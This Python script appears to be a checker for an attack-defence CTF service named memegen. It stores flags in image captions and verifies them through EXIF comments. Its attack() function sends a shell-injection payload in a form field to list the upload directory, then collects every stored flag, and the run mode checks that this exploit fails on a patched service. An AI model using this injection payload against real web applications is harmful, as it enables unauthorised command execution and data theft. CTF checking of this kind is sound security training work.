#!/usr/bin/env python3

import json
import os
import pickle
import random
import re
import shutil
import string
import sys
import tempfile

import requests

from typing import Dict, Optional, List

### Common checker stuffs ###

class WithExitCode(Exception):
    code: int

    def __init__(self, msg_opt: Optional[str] = None) -> None:
        msg = ""
        name = self.__class__.__name__
        if msg_opt is not None:
            msg = name + ": " + msg_opt
        else:
            msg = name
        super().__init__(msg)
class Corrupt(WithExitCode):
    code = 102
class Mumble(WithExitCode):
    code = 103
class Down(WithExitCode):
    code = 104
class CheckerError(WithExitCode):
    code = 110
class AttackError(Exception):
    pass

class Color:
    value: bytes

    @classmethod
    def print(cls, msg: str) -> None:
        sys.stdout.buffer.write(b"\x1b[01;" + cls.value + b"m")
        sys.stdout.buffer.flush()
        print(msg)
        sys.stdout.buffer.write(b"\x1b[m")
        sys.stdout.buffer.flush()
class Red(Color):
    value = b"31"
class Green(Color):
    value = b"32"

class Storage:
    # users and their passwords
    users: Dict[str, str]
    # users and their flag ids
    flags: Dict[str, str]
    store_path: str
    def __init__(self, path: str) -> None:
        self.store_path = path
        # default values
        self.users = {}
        self.flags = {}
    def dump(self) -> None:
        with open(self.store_path, "wb") as f:
            pickle.dump(self, f)
    @staticmethod
    def load(path: str) -> 'Storage':
        if os.path.isfile(path):
            with open(path, "rb") as f:
                store = pickle.load(f)
                store.store_path = path
                return store
        else:
            default = Storage(path)
            default.dump()
            return default

class SploitSession(requests.Session):
    def get(self, *args, **kwargs):
        try:
            return super().get(*args, **kwargs)
        except requests.RequestException:
            raise Down()

    def post(self, *args, **kwargs):
        try:
            return super().post(*args, **kwargs)
        except requests.RequestException:
            raise Down()

def gen_str(size: int) -> str:
    return "".join(random.choices(string.ascii_letters, k=size))

PORT = 3001

### Logic starts here ###

exif_line_re = re.compile(b"([^:]+?)\s+:\s+(.*)\s*")
def get_image_comment(path: str) -> str:
    import subprocess
    output = subprocess.check_output(["exiftool", path]).strip().split(b"\n")
    for line in output:
        m = exif_line_re.match(line)
        if m is not None:
            key, val = m.group(1), m.group(2)
            if key == b"Comment":
                return val.decode()
    else:
        raise Mumble("No comment in exif")

image_re = re.compile('<img src="/uploads/(.+)\.jpg" />')
def put(store: Storage, hostname: str, flag_id: str, flag: str) -> None:
    s = SploitSession()
    password = gen_str(32)
    r = s.post(hostname + "/register", data={"username": flag_id, "password": password})
    # if login successfull, we were redirected to main page
    if r.url != hostname + "/":
        raise Mumble("Failed to register")

    store.users[flag_id] = password
    store.dump()
    data = {"top_text": flag, "bottom_text": "BOTTOM TEXT"}
    files = {"my_file": open("bg.jpg", "rb")}
    r = s.post(hostname + "/save_image", data=data, files=files)
    try:
        content = r.content.decode()
    except:
        raise Mumble("Could not decode response")
    p = image_re.search(content)
    if p is None:
        raise Mumble("No image in response: " + content)
    store.flags[flag_id] = p.group(1)
    store.dump()

def get(store: Storage, hostname: str, given_id: str, flag: str) -> None:
    s = SploitSession()
    flag_uuid = store.flags[given_id]
    with s.get(hostname + "/uploads/" + flag_uuid + ".jpg", stream=True) as r:
        with tempfile.NamedTemporaryFile("wb") as tf:
            shutil.copyfileobj(r.raw, tf)
            data = json.loads(get_image_comment(tf.name))
            if data["top"] != flag:
                raise Corrupt()

def check(store: Storage, hostname: str) -> None:
    flag_id, flag = gen_str(16), gen_str(16)

    put(store, hostname, flag_id, flag)

    # check if can login afterwads
    s = SploitSession()
    password = store.users[flag_id]
    r = s.post(hostname + "/sign_in", data={"username": flag_id, "password": password})
    # if login successfull, we were redirected to main page
    if r.url != hostname + "/":
        raise Mumble("Failed to login")

    get(store, hostname, flag_id, flag)

def attack(hostname: str) -> List[str]:
    s = SploitSession()
    username, password = gen_str(32), gen_str(32)
    r = s.post(hostname + "/register", data={"username": username, "password": password})
    # if login successfull, we were redirected to main page
    if r.url != hostname + "/":
        raise Mumble("Failed to register")

    cmd = "ls public/uploads > public/index.txt"
    payload = f""" '; {cmd}; # "; {cmd}; # """
    data = {"top_text": "that feel when you gen pwned", "bottom_text": payload}
    files = {"my_file": open("bg.jpg", "rb")}
    s.post(hostname + "/save_image", data=data, files=files)
    r = s.get(hostname + "/index.txt")
    files = r.content.decode().strip().split("\n")

    result = []
    for file in files:
        try:
            with s.get(hostname + "/uploads/" + file, stream=True) as r:
                with tempfile.NamedTemporaryFile("wb") as tf:
                    shutil.copyfileobj(r.raw, tf)
                    data = json.loads(get_image_comment(tf.name))
                    result += list(data.values())
        except:
            raise AttackError()
    if len(result) == 0:
        raise AttackError("Got no flags")
    return result


def command_run(store: Storage, hostname: str):
    for _ in range(5):
        check(store, hostname)
        Green.print("check")
    try:
        attack(hostname)
        Red.print("attack")
    except AttackError as e:
        Green.print("attack")

def main() -> int:
    try:
        usage = "Usage: {} run|check|put|get|attack IP FLAGID FLAG".format(sys.argv[0])
        cmd = sys.argv[1]
        host = sys.argv[2]
        hostname = "http://{}:{}".format(host, PORT)

        dbname = f"storage-memegen-{host}-{PORT}.dump"
        store = Storage.load(dbname)

        if cmd == "get":
            fid = sys.argv[3]
            flag = sys.argv[4]
            get(store, hostname, fid, flag)
        elif cmd == "put":
            fid = sys.argv[3]
            flag = sys.argv[4]
            put(store, hostname, fid, flag)
        elif cmd == "check":
            check(store, hostname)
        elif cmd == "attack":
            r = attack(hostname)
            print(r)
        elif cmd == "run":
            command_run(store, hostname)
        else:
            print(usage)
            return CheckerError.code
        # if not thrown, everything is ok
        return 101
    except IndexError:
        print(usage)
        return CheckerError.code
    except WithExitCode as e:
        Red.print(str(e))
        return e.code
    except AttackError as e:
        Red.print("AttackError: " + str(e))
        return 1

if __name__ == "__main__":
    sys.exit(main())
